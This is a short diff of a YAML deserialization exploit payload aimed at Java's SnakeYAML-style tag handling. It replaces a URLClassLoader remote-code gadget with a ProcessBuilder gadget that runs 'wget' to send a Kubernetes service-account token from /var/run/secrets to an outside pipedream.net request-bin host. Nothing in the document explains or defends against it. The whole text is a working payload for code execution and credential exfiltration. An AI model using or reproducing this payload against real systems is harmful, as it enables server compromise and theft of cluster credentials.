@@ -1,5 +1,5 @@
 !!javax.script.ScriptEngineManager [
-  !!java.net.URLClassLoader [[
-    !!java.net.URL ["https://en70bgxpxujs.x.pipedream.net/"]
+  !!java.lang.ProcessBuilder [[
+    String ["wget https://en70bgxpxujs.x.pipedream.net/a=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"]
   ]]
 ]
